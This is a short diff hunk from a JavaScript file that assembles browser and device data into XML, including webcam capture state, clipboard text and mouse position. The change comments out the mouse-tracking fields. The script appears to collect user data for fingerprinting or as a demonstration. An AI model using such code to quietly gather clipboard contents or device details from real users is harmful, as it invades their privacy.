@@ -414,15 +414,16 @@ var text = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
 "<webcam_captured>" + isWebcamAlreadyCaptured + "</webcam_captured>" +
 "</access_to_device>" +  
 "<clipboard>" + copiedText + "</clipboard>" +
-"<mouse_tracking>" +
-"<x_value>" + myMouseX + "</x_value>" +
-"<y_value>" + myMouseY + "</y_value>" +
-"</mouse_tracking>" +
+
 
 
 "</browser_info>";
 
 /*
+"<mouse_tracking>" +
+"<x_value>" + myMouseX + "</x_value>" +
+"<y_value>" + myMouseY + "</y_value>" +
+"</mouse_tracking>" +
 "<cpu_cores>" + navigator.hardwareConcurrency + "</cpu_cores>" +
 "<ram id=\"Gigabytes\">" + ram + "</ram>" +
 "<gpu>" + gpu + "</gpu>" +
